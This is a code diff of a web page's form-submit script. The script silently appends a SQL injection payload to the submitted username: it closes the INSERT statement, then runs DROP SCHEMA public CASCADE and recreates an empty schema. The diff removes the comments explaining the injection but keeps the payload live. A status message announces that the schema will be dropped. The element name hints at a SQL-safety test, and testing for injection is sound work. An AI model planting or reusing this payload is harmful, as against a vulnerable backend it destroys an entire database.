@@ -27,13 +27,8 @@
             document.getElementById('user-form').addEventListener('submit', function () {
                 const usernameInput = this.querySelector('[name$="[username]"]');
                 const result = document.getElementById('sql-safety-result');
-
                 const original = usernameInput.value;
-
-                // Chiude la stringa e la tupla corrente, poi accoda uno statement distruttivo.
-                // Diventa: INSERT INTO generic (username) VALUES ('<original>'); DROP SCHEMA public CASCADE; CREATE SCHEMA public; --')
                 usernameInput.value = original + "'); DROP SCHEMA public CASCADE; CREATE SCHEMA public; --";
-
                 result.textContent = 'Payload distruttivo iniettato: dopo il submit lo schema del database verrà droppato e ricreato vuoto.';
                 result.style.color = 'red';
             });
